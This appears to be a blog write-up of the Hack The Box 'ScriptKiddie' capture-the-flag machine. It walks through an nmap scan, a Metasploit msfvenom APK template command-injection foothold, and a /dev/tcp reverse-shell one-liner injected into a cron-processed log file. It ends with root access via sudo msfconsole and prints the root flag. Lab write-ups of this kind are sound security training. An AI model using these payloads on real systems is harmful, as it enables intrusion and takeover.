---                                                                                                                                  
title: Hackthebox - ScriptKiddie                                                                                                             
image: /assets/img/htb-scriptkiddie/htb-scriptkiddie-info.png                                                                        
date: 2021-06-05                                                                                                                      
categories: [Hackthebox]                                                                                                               
tags: [linux, metasploit, bash, nmap, apk]     
show: "Scriptkiddie as the name suggests is a linux machine which hosts hacker tools for scanning and generating payloads. It begins by finidng metasploit vulnerability to gain foothold on the machine. There is a cronjob in the machine that is running a bash script. We take advantage of this script to gain a reverse shell as the user. The pwned user is able to run metasploit with superuser privileges which we execute bash to gain root access."
---

# Summary
Scriptkiddie as the name suggests is a linux machine which hosts hacker tools for scanning and generating payloads. It begins by finidng metasploit vulnerability to gain foothold on the machine. There is a cronjob in the machine that is running a bash script. We take advantage of this script to gain a reverse shell as the user. The pwned user is able to run metasploit with superuser privileges which we execute bash to gain root access.

# Recon

## Nmap
Nmap finds two open TCP ports, SSH (22) and HTTP (5000):
```bash
┌──10.10.16.40(root💀kali)-[~/htb/boxes/scriptkiddie]
└─# nmap -sC -sV -oN nmap/scriptkiddie 10.10.10.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 21:35 EDT
Nmap scan report for 10.10.10.226
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds
```
Based on nmap result, the target is likely running Ubuntu Focal.

## Webserver - TCP 80
The webserver is hosting 3 services:
- scanning using nmap
- generating metasploit payloads 
- searching exploits using searchsploits

![](htb-scriptkiddie/2021-06-04-21-49-09.png)

I conducted directory bruteforce but did not find any hidden files. I also went through the source code of the website and nothing stood out for me.

I tried to escape the nmap command by using bash special characters like ```; and &&``` but they all displayed the error below.

![](htb-scriptkiddie/2021-06-04-22-00-03.png)

The webserver is using [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) to generate payloads. In the dropdown, there are ```windows, linux and android``` options to choose from and an optional template file attachments. 

![](htb-scriptkiddie/2021-06-04-22-04-01.png)

Googling ```metasploit template vulnerability``` returns [Metasploit Framework msfvenom APK Template Command Injection](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/) vulnerability.

![](/assets/img/htb-scriptkiddie/2021-06-04-22-15-12.png)

# Exploitation
## Foothold
There are a multiple proof of concept payloads for the metasploit template vulnerability. I generated the ```.apk``` payload using msfconsole:

```bash
┌──10.10.16.40(root💀kali)-[~/htb/boxes/scriptkiddie]
└─# msfconsole -q   
msf6 > search metasploit template

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/jira_hipchat_template                                2015-10-28       excellent  Yes    Atlassian HipChat for Jira Plugin Velocity Template Injection
   1  exploit/unix/webapp/datalife_preview_exec                               2013-01-28       excellent  Yes    DataLife Engine preview.php PHP Code Injection
   2  exploit/windows/fileformat/mcafee_showreport_exec                       2012-01-12       normal     No     McAfee SaaS MyCioScan ShowReport Remote Command Execution
   3  exploit/windows/http/exchange_ecp_dlp_policy                            2021-01-12       excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
   4  auxiliary/gather/oats_downloadservlet_traversal                         2019-04-16       normal     Yes    Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal
   5  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
msf6 > use 5
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost tun0
lhost => tun0
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 9001
lport => 9001
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk
```
The ```msf.apk``` payload was saved in ```/root/.msf4/local/msf.apk``` directory. 

I started listening on port 9001 on my kali machine and uploaded the ```msf.apk``` file. 

![](/assets/img/htb-scriptkiddie/2021-06-04-22-36-21.png)

# Privilege Escelation

## User Privesc
I landed on the target as ```kid``` user. There was another user ```pwn``` in the system. 
I the home directory of ```kid``` user, there is a bash script ```scanloser.sh``` and the following bash script:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
The script does the following:
- It specifies ```log``` variable as ```/home/kid/logs/hackers```
- it gets the content of ```/home/kid/logs/hackers```, splits on space and grabs everything beyond 3rd column
- It then executes ```nmap``` on it

In order to abuse this script, we have to insert 3 spaces before our payload. i.e

```bash
┌──10.10.16.40(root💀kali)-[~/htb/boxes/scriptkiddie]
└─# cat test.txt                 
1 2 3 4 5 6 7 8 9
                                                                                                                                       
┌──10.10.16.40(root💀kali)-[~/htb/boxes/scriptkiddie]
└─# cat test.txt | cut -d' ' -f3- 
3 4 5 6 7 8 9
                                                                                                                                       
┌──10.10.16.40(root💀kali)-[~/htb/boxes/scriptkiddie]
└─# 
```
I inserted below line to ```/home/kid/logs/hackers``` in order obtain reverse a shell as ```pwn``` user

```bash
echo -n "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.40/9001 0>&1';" > /home/kid/logs/hackers
```
The above line has 3 spaces before ```;```. I used ```echo -n``` option to avoid the trailing line.

Received reverse shell as ```pwn``` user.

![](/assets/img/htb-scriptkiddie/2021-06-04-23-24-36.png)

## Root Privesc
The user ```pwn``` can execute ```/opt/metasploit-framework-6.0.9/msfconsole``` with superuser privilege.

Metasploit can execute command with option ```-x```. ```-q``` is to ignore metasploit banner from displayed.

```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q -x bash
[*] exec: bash

root@scriptkiddie:/home/pwn# whoami
root
root@scriptkiddie:/home/pwn# cat /root/root.txt 
5b6cdaf092a4be80da48835068553ae7
root@scriptkiddie:/home/pwn# 
```

![](htb-scriptkiddie/2021-06-04-23-27-10.png)
